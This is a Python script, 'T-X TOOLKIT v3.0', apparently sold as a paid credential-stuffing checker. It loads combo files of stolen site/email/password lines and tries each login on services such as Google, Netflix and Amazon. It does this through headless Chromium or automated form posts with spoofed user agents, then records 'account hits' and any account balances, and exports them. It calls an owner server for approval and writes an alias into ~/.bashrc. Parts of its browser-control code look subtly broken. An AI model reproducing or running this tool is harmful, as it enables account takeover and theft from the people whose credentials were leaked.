#!/usr/bin/env python3
"""
T-X TOOLKIT v3.0 
Created by Saeka Tojirp
Usage : tx
"""

import os, sys, time, re, json, threading, random, hashlib, uuid, shutil, socket, ssl
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
init(autoreset=True)

# ── CONFIG ──
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
APPROVED_FILE = os.path.expanduser("~/.tx_approved")
ALIAS_FILE = os.path.expanduser("~/.bashrc")
CHROME_PATH = "/data/data/com.termux/files/usr/bin/chromium-browser"

R = Fore.RED; G = Fore.GREEN; B = Fore.BLUE; Y = Fore.YELLOW
M = Fore.MAGENTA; C = Fore.CYAN; W = Fore.WHITE
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
GLITCH_COLORS = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
]

# ── UTILS ──
def tw(): return shutil.get_terminal_size().columns

def fix_url(url):
    if not url: return url
    url = url.strip()
    if not url.startswith(('http://','https://')):
        url = 'https://' + url
    return url

def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")

def spin(text, sec=1.2):
    frm = ['◜','◠','◝','◞','◡','◟']
    end = time.time()+sec; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
        time.sleep(0.08); i+=1
    sys.stdout.write("\r"+" "*50+"\r")

def progress(cur, tot, label=""):
    if tot<=0: return
    pct = int((cur/tot)*100)
    filled = int(30*cur/tot)
    bar = f"{G}{'█'*filled}{DIM}{'░'*(30-filled)}{RES}"
    sys.stdout.write(f"\r  {label} |{bar}| {pct}% ({cur}/{tot})")
    sys.stdout.flush()
    if cur==tot: sys.stdout.write("\n")

def detect_platform(url):
    domain = urlparse(url).netloc.lower()
    if 'google' in domain: return 'Google'
    if 'facebook' in domain or 'fb.com' in domain: return 'Facebook'
    if 'instagram' in domain: return 'Instagram'
    if 'twitter' in domain or 'x.com' in domain: return 'Twitter/X'
    if 'netflix' in domain: return 'Netflix'
    if 'spotify' in domain: return 'Spotify'
    if 'amazon' in domain: return 'Amazon'
    if 'linkedin' in domain: return 'LinkedIn'
    if 'github' in domain: return 'GitHub'
    if 'microsoft' in domain or 'live.com' in domain: return 'Microsoft'
    if 'yahoo' in domain: return 'Yahoo'
    if 'discord' in domain: return 'Discord'
    return domain.split('.')[-2].capitalize() if '.' in domain else 'Generic'

# ── REAL CHROME ENGINE ──
class RealChromeChecker:
    def __init__(self):
        self.process = None

    def _start_browser(self):
        """Launch headless Chromium with DevTools port."""
        args = [
            CHROME_PATH,
            "--remote-debugging-port=9222",
            "--no-first-run", "--no-default-browser-check",
            "--disable-gpu", "--disable-software-rasterizer",
            "--disable-dev-shm-usage", "--headless=new"
        ]
        self.process = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

    def _get_ws_url(self):
        """Get DevTools WebSocket URL."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 9222))
        req = "GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n"
        sock.send(req.encode())
        resp = sock.recv(4096).decode()
        sock.close()
        body = resp.split('\r\n\r\n', 1)[1]
        return json.loads(body)["webSocketDebuggerUrl"]

    def _ws_send(self, ws_url, method, params={}):
        """Send command via raw WebSocket to DevTools."""
        p = urlparse(ws_url)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(sock, server_hostname=p.hostname)
        s.connect((p.hostname, p.port))
        # WebSocket handshake
        hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\n"
              f"Host: {p.hostname}:{p.port}\r\n"
              f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
              f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
              f"Sec-WebSocket-Version: 13\r\n\r\n")
        s.send(hs.encode())
        s.recv(4096)
        # Send payload
        payload = json.dumps({"id":1,"method":method,"params":params})
        frame = b'\x81' + bytes([len(payload)]) + payload.encode()
        s.send(frame)
        resp = s.recv(8192)
        s.close()
        if len(resp) > 2:
            return json.loads(resp[2:])
        return {}

    def attempt_login(self, url, email, password):
        """Real Chromium login attempt."""
        res = {
            'link':url, 'email':email, 'pass':password,
            'active':False, 'info':'', 'balance':'',
            'time':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'platform':detect_platform(url)
        }
        url = fix_url(url)

        try:
            self._start_browser()
            ws = self._get_ws_url()

            # Create page
            target = self._ws_send(ws, "Target.createTarget", {"url":"about:blank"})

            # Navigate
            self._ws_send(ws, "Page.navigate", {"url":url})
            time.sleep(4)

            # Fill form
            js_fill = f"""
                const e = document.querySelector('input[type="email"], input[type="text"], input[name*="email"], input[name*="user"], input[name*="login"]');
                const p = document.querySelector('input[type="password"]');
                if(e) e.value = '{email}';
                if(p) p.value = '{password}';
                const btn = document.querySelector('button[type="submit"], input[type="submit"]');
                if(btn) btn.click(); else if(p && p.form) p.form.submit();
                'done'
            """
            self._ws_send(ws, "Runtime.evaluate", {"expression":js_fill})
            time.sleep(3)

            # Check success
            js_check = "document.body.innerText.includes('Logout') || document.body.innerText.includes('My Account') || document.body.innerText.includes('Dashboard') || document.body.innerText.includes('Sign Out')"
            result = self._ws_send(ws, "Runtime.evaluate", {"expression":js_check})
            success = bool(result.get("result",{}).get("value",False))

            if success:
                res['active'] = True
                res['info'] = "Login successful (Chrome DOM)"
            else:
                # Fallback: check URL redirect
                js_url = "window.location.href"
                url_check = self._ws_send(ws, "Runtime.evaluate", {"expression":js_url})
                current_url = url_check.get("result",{}).get("value","")
                if current_url and 'login' not in current_url.lower() and 'signin' not in current_url.lower():
                    res['active'] = True
                    res['info'] = "Redirected away from login"
                else:
                    res['active'] = False
                    res['info'] = "Still on login page"

        except Exception as e:
            res['info'] = f"Chrome error: {str(e)[:40]}"
        finally:
            if self.process:
                self.process.terminate()
                self.process = None

        return res

# ── HTTP FALLBACK CHECKER ──
def http_login_check(url, email, password):
    res = {
        'link':url, 'email':email, 'pass':password,
        'active':False, 'info':'', 'balance':'',
        'time':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'platform':detect_platform(url)
    }
    url = fix_url(url)
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })
    try:
        time.sleep(random.uniform(0.3, 1.0))
        r = sess.get(url, timeout=12, allow_redirects=True)
        soup = BeautifulSoup(r.text, 'html.parser')
        form = None
        for f in soup.find_all('form'):
            if f.find('input', {'type':'password'}):
                form = f; break
        if not form:
            if any(kw in r.text.lower() for kw in ['logout','dashboard','account']):
                res['active'] = True; res['info'] = "Already logged in"
            else:
                res['info'] = "No login form"
            return res
        inputs = {i.get('name'):i.get('value','') for i in form.find_all('input') if i.get('name')}
        user_f = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
        if not user_f:
            for k in inputs:
                if k not in ('password','pass','pwd','submit','button','csrf','token'):
                    user_f = k; break
        pass_f = next((k for k in inputs if 'pass' in k), 'password')
        action = urljoin(url, form.get('action',''))
        csrf_token = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
        csrf_name = next((k for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
        data = {user_f:email, pass_f:password}
        if csrf_name and csrf_token: data[csrf_name] = csrf_token
        for k,v in inputs.items():
            if k not in (user_f,pass_f,csrf_name): data[k] = v
        sess.headers['Referer'] = url
        r2 = sess.post(action, data=data, timeout=12, allow_redirects=True)
        text = r2.text.lower(); final_url = r2.url.lower()
        success_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','my account','sign out']
        fail_kw = ['incorrect','invalid','wrong','error','not found',"doesn't match",'does not match','please try again','password is incorrect','login failed']
        if any(kw in text for kw in success_kw) and not any(kw in text for kw in fail_kw):
            res['active'] = True; res['info'] = f"HTTP {r2.status_code}"
        elif any(kw in text for kw in fail_kw):
            res['active'] = False; res['info'] = "Invalid credentials"
        elif 'login' not in final_url and 'signin' not in final_url and 'auth' not in final_url:
            res['active'] = True; res['info'] = "Redirected"
        elif len(sess.cookies) > 2:
            res['active'] = True; res['info'] = "Session cookies"
        else:
            res['active'] = False; res['info'] = "Still on login"
        bal = re.search(r'(?:balance|credit|points)[\s:$]*(\d+\.?\d{0,2})', r2.text, re.I)
        if bal: res['balance'] = bal.group(1)
    except Exception as e:
        res['info'] = f"Error: {str(e)[:40]}"
    return res

# ── AUTH ──
def generate_token(name):
    raw = f"{name}-{uuid.uuid4().hex}-{int(time.time())}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()

def request_token_once(name):
    if os.path.exists(APPROVED_FILE):
        with open(APPROVED_FILE,'r') as f:
            if f.read().strip() == 'approved':
                return None, 'approved'
    token = generate_token(name)
    try:
        r = requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
        if r.status_code==201:
            data = r.json()
            if data.get('status')=='approved':
                with open(APPROVED_FILE,'w') as f: f.write('approved')
                return token, 'approved'
            return token, 'pending'
    except: pass
    return token, 'pending'

def wait_for_approval(token):
    while True:
        try:
            r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
            if r.status_code==200:
                data = r.json()
                if data['status']=='approved':
                    with open(APPROVED_FILE,'w') as f: f.write('approved')
                    return True
                elif data['status']=='declined':
                    return False
        except: pass
        time.sleep(3)

# ── MAIN ──
def main():
    for _ in range(10):
        os.system('clear')
        spin("Initialising...", 0.5)
        center_print("WELCOME TO T-X TOOLKIT", random.choice(COLOR_LOOP))
        time.sleep(0.5)

    os.system('clear')
    center_print("WHAT SHOULD YOUR NAME BE?", Y)
    name = input(f"  {W}> {RES}").strip()
    if not name: name = "User"

    os.system('clear')
    token, status = request_token_once(name)
    if status == 'approved':
        center_print("ACCESS GRANTED", G)
        time.sleep(1)
    else:
        center_print("PERMISSION REQUIRED!", R)
        time.sleep(0.5)
        center_print(f"YOUR REQUEST TOKEN IS {token}", W)
        center_print("PLEASE ASK THE OWNER TO APPROVE", DIM)
        if not wait_for_approval(token):
            center_print("REQUEST DECLINED!", R)
            sys.exit(0)
        os.system('clear')
        center_print("ACCESS GRANTED", G)
        time.sleep(1)

    combo_file = None
    hits = []
    checker = RealChromeChecker()

    while True:
        os.system('clear')
        w = tw()
        print(f"{G}HI! {name}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
        title = "T-X PAID TOOL"
        for i,ch in enumerate(title):
            sys.stdout.write(f"{GLITCH_COLORS[i%len(GLITCH_COLORS)]}{ch}{RES}")
        print("\n")
        menu = ["[ 1 ] START CHECKING","[ 2 ] SEE ACCOUNT HITS!","[ 3 ] EXPORT LOGS","[ 4 ] SETUP FILE PATH","[ 5 ] EXIT"]
        for idx,line in enumerate(menu):
            if idx==3 and not combo_file:
                print(f"  {R}{line}{RES}")
            else:
                print(f"  {W}{line}{RES}")
        t = int(time.time())%10//5
        creator_color = COLOR_LOOP[t]
        print(f"\n  {creator_color}Created{RES} by Saeka Tojirp.", end='')
        try:
            choice = input(f"\n  {W}> {RES}").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if choice=='1':
            if not combo_file:
                print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
            combos = []
            with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
                for line in f:
                    line=line.strip()
                    if not line or line.startswith('#'): continue
                    if '|' in line:
                        parts=line.split('|')
                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),'|'.join(parts[2:]).strip()))
                    elif '://' in line:
                        proto,rest=line.split('://',1)
                        if ':' in rest:
                            domain,creds=rest.split(':',1)
                            e,pw=creds.split(':',1) if ':' in creds else (creds,'')
                            combos.append((proto+'://'+domain,e.strip(),pw.strip()))
                    else:
                        parts=line.split(':')
                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),':'.join(parts[2:]).strip()))
            if not combos:
                print(f"  {R}No combos.{RES}"); time.sleep(1); continue
            results=[]; total=len(combos); done=0; active=0; lock=threading.Lock()
            print(f"\n  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}")
            print(f"  {DIM}{'─'*90}{RES}")
            def worker(url,email,pw):
                nonlocal done,active
                # Try Chrome first, fallback to HTTP
                res = checker.attempt_login(url,email,pw)
                if not res['active'] and 'Chrome error' in res.get('info',''):
                    res = http_login_check(url,email,pw)
                with lock:
                    results.append(res); done+=1
                    if res['active']: active+=1
                    act=f"{G}ACCOUNT HIT!{RES}" if res['active'] else f"{R}INVALID{RES}"
                    print(f"  {W}{res['link'][:33]:<35}{DIM} | {RES}{W}{res['email'][:26]:<28}{DIM} | {RES}{W}{res['pass'][:18]:<20}{DIM} | {RES}{act}")
                    progress(done,total,"Checking")
            with ThreadPoolExecutor(max_workers=3) as ex:
                for url,email,pw in combos: ex.submit(worker,url,email,pw)
            print(f"\n  {G}{active}/{total} active.{RES}")
            hits.extend([r for r in results if r['active']]); time.sleep(1)

        elif choice=='2':
            os.system('clear')
            if not hits: print(f"  {Y}No hits.{RES}")
            else:
                page=0; per=5
                while True:
                    os.system('clear')
                    print(f"  {G}HITS{RES}  Page {page+1}/{ (len(hits)-1)//per +1 }")
                    for r in hits[page*per:(page+1)*per]: print(f"  {r['email']}:{r['pass']} | {r.get('balance','')} | {r.get('time','')}")
                    print(f"\n  {DIM}[N]ext [P]rev [Q]uit{RES}")
                    k=input().strip().lower()
                    if k=='n' and page<(len(hits)-1)//per: page+=1
                    elif k=='p' and page>0: page-=1
                    elif k=='q': break
            time.sleep(0.5)

        elif choice=='3':
            fn=f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(fn,'w') as f: json.dump(hits,f,indent=2)
            print(f"  {G}Exported to {fn}{RES}"); time.sleep(1)

        elif choice=='4':
            path=input(f"  {W}Combo file path: {RES}").strip()
            if os.path.exists(path): combo_file=path; print(f"  {G}File set!{RES}")
            else: print(f"  {R}Not found.{RES}")
            time.sleep(1)

        elif choice=='5':
            break

def setup_alias():
    if not os.path.exists(ALIAS_FILE): return
    alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
    with open(ALIAS_FILE,'r') as f: content = f.read()
    if alias_cmd not in content:
        os.system(f"echo \"{alias_cmd}\" >> {ALIAS_FILE}")

if __name__=="__main__":
    setup_alias()
    main()
